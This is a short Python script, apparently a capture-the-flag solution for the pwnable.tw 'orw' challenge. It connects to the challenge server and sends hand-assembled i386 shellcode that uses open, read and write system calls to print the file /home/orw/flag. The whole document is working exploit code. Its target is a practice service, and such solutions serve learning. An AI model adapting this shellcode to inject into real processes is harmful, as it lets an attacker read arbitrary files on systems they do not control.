from pwn import *
host = "chall.pwnable.tw"
port = 10001

r = remote(host, port)
context.arch = "i386"

sc = asm("""
    jmp str
open:
    mov eax, 5
    pop ebx
    int 0x80
read:
    mov ebx, eax
    mov edx, 0x50
    mov eax, 3
    mov ecx, 0x804a128
    int 0x80

write:
    xor ebx, ebx
    mov eax, 4
    int 0x80

exit:
    mov eax, 1
    int 0x80
str:
    call open
    .string "/home/orw/flag"
""")
r.send(sc)
r.interactive()
